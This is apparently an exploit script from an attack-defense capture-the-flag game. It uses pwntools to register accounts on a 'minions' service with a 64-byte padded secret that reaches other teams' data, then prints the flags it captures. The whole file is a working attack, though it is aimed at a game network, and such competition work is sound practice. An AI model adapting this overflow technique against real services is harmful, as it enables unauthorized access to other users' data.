#!/usr/bin/env python3

import checklib
import requests
import sys
import json
import re
from pwn import remote, context

regex = re.compile('[A-Z0-9]{31}=')
ALPH = [chr(i) for i in range(65, 65 + 26)] + [chr(i) for i in range(97, 97 + 26)]

def get_attack_data() -> dict[str]:
    return requests.get(f"http://{forcad_host}/api/client/attack_data").json()

def random_chars():
    return checklib.rnd_string(10, ALPH)

def register(io: remote, username: str, password: str, secret: str):
    io.sendline(b"1")
    
    io.recvuntil(b'Enter minions name: ')
    io.sendline(username.encode())

    io.recvuntil(b'Enter minions password: ')
    io.sendline(password.encode())

    io.recvuntil(b'Enter minions secret: ')
    io.sendline(secret.encode())

    io.recvuntil(b'Enter command: ')

def login(io: remote, username: str, password: str):
    io.sendline(b"2")
    
    io.recvuntil(b'Enter minions name: ')
    io.sendline(username.encode())

    io.recvuntil(b'Enter minions password: ')
    io.sendline(password.encode())
    io.recvuntil(b'Enter command: ')

def get_flag(io: remote):
    io.sendline(b"6")
    resp: str = io.recvuntil(b'Enter command: ').decode()
    print()
    print(regex.findall(resp), flush=True)

def logout(io: remote):
    io.sendline(b"8")
    io.recvuntil(b'Enter command: ')
    
rnd_username = random_chars()
rnd_password = random_chars()

PORT = 7771
ip = sys.argv[1]
forcad_host = "10.10.10.10"

attack_data = get_attack_data()["minions"][ip]

io = remote(ip, PORT)

for data in attack_data:
    data = json.loads(data)

    payload = "a"*64 + data["family_name"]
    register(io, rnd_username, rnd_password, payload)
    login(io, rnd_username, rnd_password)

    get_flag(io)

    logout(io)

